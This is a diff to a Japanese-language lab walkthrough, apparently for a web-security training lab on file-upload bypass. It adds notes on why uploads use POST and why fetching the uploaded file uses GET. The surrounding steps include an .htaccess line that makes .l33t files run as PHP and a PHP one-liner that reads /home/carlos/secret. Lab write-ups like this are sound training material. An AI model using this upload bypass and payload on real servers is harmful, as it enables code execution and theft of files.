@@ -33,6 +33,17 @@ Content-Type: text/plain
 AddType application/x-httpd-php .l33t
 ```
 
+POST = サーバーにデータを送る
+
+• アバター画像を送る
+• .htaccess を送る
+• exploit.l33t を送る
+
+
+全部「サーバーにファイルを渡す」動作。
+
+だから POST。
+
 ## STEP 4: exploit.l33t をアップロード（タブB）
 ```
 filename="exploit.l33t"
@@ -40,6 +51,20 @@ Content-Type: text/plain
 
 <?php echo file_get_contents('/home/carlos/secret'); ?>
 ```
+
+GET = サーバーからデータを取りに行く
+
+GET /files/avatars/exploit.l33t
+
+
+これは、
+
+👉「そのファイルの中身を見せて」
+
+という意味。
+
+そしてサーバーは .l33t を PHP として実行する設定になってるから、
+中の PHP が動いて 秘密ファイルの内容が返ってくる。
 
 ## STEP 5: PHPシェルを実行（タブA）
 ```
